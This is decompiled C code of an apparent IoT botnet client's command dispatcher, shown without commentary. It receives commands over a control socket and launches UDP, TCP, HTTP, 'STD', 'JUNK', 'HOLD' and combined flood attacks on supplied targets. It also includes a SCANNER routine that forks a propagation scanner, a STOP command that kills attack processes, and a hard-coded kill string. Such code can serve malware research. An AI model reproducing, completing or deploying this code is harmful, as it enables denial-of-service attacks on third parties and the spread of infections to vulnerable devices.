
void processCmd(int param_1,char **param_2)

{
  int iVar1;
  __pid_t _Var2;
  long lVar3;
  uint uVar4;
  uint uVar5;
  char *pcVar6;
  int iVar7;
  char *pcVar8;
  int iVar9;
  char *pcVar10;
  int iVar11;
  int iVar12;
  uint local_e8;
  int local_e4;
  char *local_e0;
  char *local_d0;
  char *local_b0;
  char *local_a0;
  char *local_84;
  char *local_74;
  char *local_64;
  undefined4 local_54;
  int local_30;
  int local_2c;
  int local_28;
  
  iVar1 = strcmp(*param_2,"PING");
  if (iVar1 == 0) {
    sockprintf(mainCommSock,&DAT_00418650);
    return;
  }
  iVar1 = strcmp(*param_2,"SCANNER");
  if (iVar1 == 0) {
    _Var2 = fork();
    lVar3 = sysconf(0x54);
    local_54 = 999999;
    if (lVar3 == 1) {
      local_54 = 500;
    }
    if (1 < lVar3) {
      local_54 = 1000;
    }
    if (_Var2 != 0) {
      scanPid = _Var2;
      return;
    }
    if (0 < lVar3) {
      uVar4 = time((time_t *)0x0);
      uVar5 = getpid();
      _Var2 = getppid();
      srandom((uVar4 ^ uVar5) + _Var2);
      uVar4 = time((time_t *)0x0);
      uVar5 = getpid();
      init_rand(uVar4 ^ uVar5);
      StartTheLelz(100,local_54);
                    /* WARNING: Subroutine does not return */
      _exit(0);
    }
  }
  iVar1 = strcmp(*param_2,"STD");
  if (iVar1 == 0) {
    if (param_1 < 4) {
      return;
    }
    iVar1 = atoi(param_2[2]);
    if (iVar1 < 1) {
      return;
    }
    iVar1 = atoi(param_2[3]);
    if (iVar1 < 1) {
      return;
    }
    pcVar6 = param_2[1];
    iVar1 = atoi(param_2[2]);
    iVar7 = atoi(param_2[3]);
    pcVar8 = strchr(pcVar6,0x2c);
    if (pcVar8 == (char *)0x0) {
      iVar9 = listFork();
      if (iVar9 != 0) {
        return;
      }
      sendSTD(pcVar6,iVar1,iVar7);
                    /* WARNING: Subroutine does not return */
      _exit(0);
    }
    local_64 = strtok(pcVar6,",");
    while (local_64 != (char *)0x0) {
      iVar9 = listFork();
      if (iVar9 == 0) {
        sendSTD(local_64,iVar1,iVar7);
                    /* WARNING: Subroutine does not return */
        _exit(0);
      }
      local_64 = strtok((char *)0x0,",");
    }
  }
  iVar1 = strcmp(*param_2,"CNC");
  if (iVar1 == 0) {
    if (param_1 < 4) {
      return;
    }
    iVar1 = atoi(param_2[2]);
    if (iVar1 < 1) {
      return;
    }
    iVar1 = atoi(param_2[3]);
    if (iVar1 < 1) {
      return;
    }
    pcVar6 = param_2[1];
    iVar1 = atoi(param_2[2]);
    iVar7 = atoi(param_2[3]);
    pcVar8 = strchr(pcVar6,0x2c);
    if (pcVar8 == (char *)0x0) {
      iVar9 = listFork();
      if (iVar9 != 0) {
        return;
      }
      sendCNC(pcVar6,iVar1,iVar7);
                    /* WARNING: Subroutine does not return */
      _exit(0);
    }
    local_74 = strtok(pcVar6,",");
    while (local_74 != (char *)0x0) {
      iVar9 = listFork();
      if (iVar9 == 0) {
        sendCNC(local_74,iVar1,iVar7);
        close(mainCommSock);
                    /* WARNING: Subroutine does not return */
        _exit(0);
      }
      local_74 = strtok((char *)0x0,",");
    }
  }
  iVar1 = strcmp(*param_2,"JUNK");
  if (iVar1 == 0) {
    if (param_1 < 4) {
      return;
    }
    iVar1 = atoi(param_2[2]);
    if (iVar1 < 1) {
      return;
    }
    iVar1 = atoi(param_2[3]);
    if (iVar1 < 1) {
      return;
    }
    pcVar6 = param_2[1];
    iVar1 = atoi(param_2[2]);
    iVar7 = atoi(param_2[3]);
    pcVar8 = strchr(pcVar6,0x2c);
    if (pcVar8 == (char *)0x0) {
      iVar9 = listFork();
      if (iVar9 != 0) {
        return;
      }
      sendJUNK(pcVar6,iVar1,iVar7);
                    /* WARNING: Subroutine does not return */
      _exit(0);
    }
    local_84 = strtok(pcVar6,",");
    while (local_84 != (char *)0x0) {
      iVar9 = listFork();
      if (iVar9 == 0) {
        sendJUNK(local_84,iVar1,iVar7);
        close(mainCommSock);
                    /* WARNING: Subroutine does not return */
        _exit(0);
      }
      local_84 = strtok((char *)0x0,",");
    }
  }
  iVar1 = strcmp(*param_2,"HTTPFLOOD");
  if (iVar1 == 0) {
    if (param_1 < 6) {
      return;
    }
    iVar1 = atoi(param_2[3]);
    if (iVar1 < 1) {
      return;
    }
    iVar1 = atoi(param_2[5]);
    if (iVar1 < 1) {
      return;
    }
    iVar7 = listFork();
    iVar1 = mainCommSock;
    if (iVar7 != 0) {
      return;
    }
    pcVar6 = param_2[1];
    pcVar8 = param_2[2];
    iVar7 = atoi(param_2[3]);
    iVar9 = atoi(param_2[5]);
    sockprintf(iVar1,"HTTP %s Flooding %s:%d for %d seconds",pcVar6,pcVar8,iVar7,iVar9);
    pcVar6 = param_2[1];
    pcVar8 = param_2[2];
    uVar4 = atoi(param_2[3]);
    pcVar10 = param_2[4];
    iVar1 = atoi(param_2[5]);
    iVar7 = atoi(param_2[6]);
    sendHTTP(pcVar6,pcVar8,uVar4 & 0xffff,pcVar10,iVar1,iVar7);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar1 = strcmp(*param_2,"UDP");
  if (iVar1 == 0) {
    if (param_1 < 6) {
      return;
    }
    iVar1 = atoi(param_2[3]);
    if (iVar1 == -1) {
      return;
    }
    iVar1 = atoi(param_2[2]);
    if (iVar1 == -1) {
      return;
    }
    iVar1 = atoi(param_2[4]);
    if (iVar1 == -1) {
      return;
    }
    iVar1 = atoi(param_2[5]);
    if (iVar1 == -1) {
      return;
    }
    iVar1 = atoi(param_2[5]);
    if (0xffdc < iVar1) {
      return;
    }
    iVar1 = atoi(param_2[4]);
    if (0x20 < iVar1) {
      return;
    }
    if ((param_1 == 7) && (iVar1 = atoi(param_2[6]), iVar1 < 1)) {
      return;
    }
    pcVar6 = param_2[1];
    iVar1 = atoi(param_2[2]);
    iVar7 = atoi(param_2[3]);
    iVar9 = atoi(param_2[4]);
    iVar11 = atoi(param_2[5]);
    if (param_1 == 7) {
      local_28 = atoi(param_2[6]);
    }
    else {
      local_28 = 10;
    }
    pcVar8 = strchr(pcVar6,0x2c);
    if (pcVar8 == (char *)0x0) {
      iVar12 = listFork();
      if (iVar12 != 0) {
        return;
      }
      sockprintf(mainCommSock,"UDP Flooding %s:%d for %d seconds.",pcVar6,iVar1,iVar7);
      sendUDP(pcVar6,iVar1,iVar7,iVar9,iVar11,local_28);
      close(mainCommSock);
                    /* WARNING: Subroutine does not return */
      _exit(0);
    }
    sockprintf(mainCommSock,"UDP Flooding %s for %d seconds.",pcVar6,iVar7);
    local_a0 = strtok(pcVar6,",");
    while (local_a0 != (char *)0x0) {
      iVar12 = listFork();
      if (iVar12 == 0) {
        sendUDP(local_a0,iVar1,iVar7,iVar9,iVar11,local_28);
        close(mainCommSock);
                    /* WARNING: Subroutine does not return */
        _exit(0);
      }
      local_a0 = strtok((char *)0x0,",");
    }
  }
  iVar1 = strcmp(*param_2,"HOLD");
  if (iVar1 == 0) {
    if (param_1 < 4) {
      return;
    }
    iVar1 = atoi(param_2[2]);
    if (iVar1 < 1) {
      return;
    }
    iVar1 = atoi(param_2[3]);
    if (iVar1 < 1) {
      return;
    }
    pcVar6 = param_2[1];
    iVar1 = atoi(param_2[2]);
    iVar7 = atoi(param_2[3]);
    pcVar8 = strchr(pcVar6,0x2c);
    if (pcVar8 == (char *)0x0) {
      iVar9 = listFork();
      if (iVar9 != 0) {
        return;
      }
      sendHOLD(pcVar6,iVar1,iVar7);
                    /* WARNING: Subroutine does not return */
      _exit(0);
    }
    local_b0 = strtok(pcVar6,",");
    while (local_b0 != (char *)0x0) {
      iVar9 = listFork();
      if (iVar9 == 0) {
        sendHOLD(local_b0,iVar1,iVar7);
                    /* WARNING: Subroutine does not return */
        _exit(0);
      }
      local_b0 = strtok((char *)0x0,",");
    }
  }
  iVar1 = strcmp(*param_2,"TCP");
  if (iVar1 == 0) {
    if (param_1 < 6) {
      return;
    }
    iVar1 = atoi(param_2[3]);
    if (iVar1 == -1) {
      return;
    }
    iVar1 = atoi(param_2[2]);
    if (iVar1 == -1) {
      return;
    }
    iVar1 = atoi(param_2[4]);
    if (iVar1 == -1) {
      return;
    }
    iVar1 = atoi(param_2[4]);
    if (0x20 < iVar1) {
      return;
    }
    if ((6 < param_1) && (iVar1 = atoi(param_2[6]), iVar1 < 0)) {
      return;
    }
    if ((param_1 == 8) && (iVar1 = atoi(param_2[7]), iVar1 < 1)) {
      return;
    }
    pcVar6 = param_2[1];
    iVar1 = atoi(param_2[2]);
    iVar7 = atoi(param_2[3]);
    iVar9 = atoi(param_2[4]);
    pcVar8 = param_2[5];
    if (param_1 == 8) {
      local_2c = atoi(param_2[7]);
    }
    else {
      local_2c = 10;
    }
    if (param_1 < 7) {
      local_30 = 0;
    }
    else {
      local_30 = atoi(param_2[6]);
    }
    pcVar10 = strchr(pcVar6,0x2c);
    if (pcVar10 == (char *)0x0) {
      iVar11 = listFork();
      if (iVar11 != 0) {
        return;
      }
      sockprintf(mainCommSock,"TCP Flooding %s for %d seconds.",pcVar6,iVar7);
      sendTCP(pcVar6,iVar1,iVar7,iVar9,pcVar8,local_30,local_2c);
      close(mainCommSock);
                    /* WARNING: Subroutine does not return */
      _exit(0);
    }
    sockprintf(mainCommSock,"TCP Flooding %s for %d seconds.",pcVar6,iVar7);
    local_d0 = strtok(pcVar6,",");
    while (local_d0 != (char *)0x0) {
      iVar11 = listFork();
      if (iVar11 == 0) {
        sendTCP(local_d0,iVar1,iVar7,iVar9,pcVar8,local_30,local_2c);
        close(mainCommSock);
                    /* WARNING: Subroutine does not return */
        _exit(0);
      }
      local_d0 = strtok((char *)0x0,",");
    }
  }
  iVar1 = strcmp(*param_2,"COMBO");
  if (iVar1 == 0) {
    if (param_1 < 4) {
      return;
    }
    iVar1 = atoi(param_2[2]);
    if (iVar1 < 1) {
      return;
    }
    iVar1 = atoi(param_2[3]);
    if (iVar1 < 1) {
      return;
    }
    pcVar6 = param_2[1];
    iVar1 = atoi(param_2[2]);
    iVar7 = atoi(param_2[3]);
    pcVar8 = strchr(pcVar6,0x2c);
    if (pcVar8 == (char *)0x0) {
      iVar9 = listFork();
      if (iVar9 != 0) {
        return;
      }
      sendHOLD(pcVar6,iVar1,iVar7);
      sendJUNK(pcVar6,iVar1,iVar7);
      sendHOLD(pcVar6,iVar1,iVar7);
                    /* WARNING: Subroutine does not return */
      _exit(0);
    }
    local_e0 = strtok(pcVar6,",");
    while (local_e0 != (char *)0x0) {
      iVar9 = listFork();
      if (iVar9 == 0) {
        sendHOLD(local_e0,iVar1,iVar7);
        sendJUNK(local_e0,iVar1,iVar7);
        sendHOLD(local_e0,iVar1,iVar7);
        close(mainCommSock);
                    /* WARNING: Subroutine does not return */
        _exit(0);
      }
      local_e0 = strtok((char *)0x0,",");
    }
  }
  iVar1 = strcmp(*param_2,"STOP");
  if (iVar1 == 0) {
    local_e4 = 0;
    for (local_e8 = 0; (numpids._0_4_ != 0 || (local_e8 < numpids._4_4_)); local_e8 = local_e8 + 1)
    {
      if ((*(int *)(local_e8 * 4 + pids) != 0) &&
         (iVar1 = *(int *)(local_e8 * 4 + pids), _Var2 = getpid(), iVar1 != _Var2)) {
        kill(*(__pid_t *)(local_e8 * 4 + pids),9);
        local_e4 = local_e4 + 1;
      }
    }
    if (local_e4 < 1) {
      sockprintf(mainCommSock,"None Killed.");
    }
    else {
      sockprintf(mainCommSock,"Killed %d.",local_e4);
    }
  }
  iVar1 = strcmp(*param_2,"U#CK12954kY");
  if (iVar1 != 0) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}

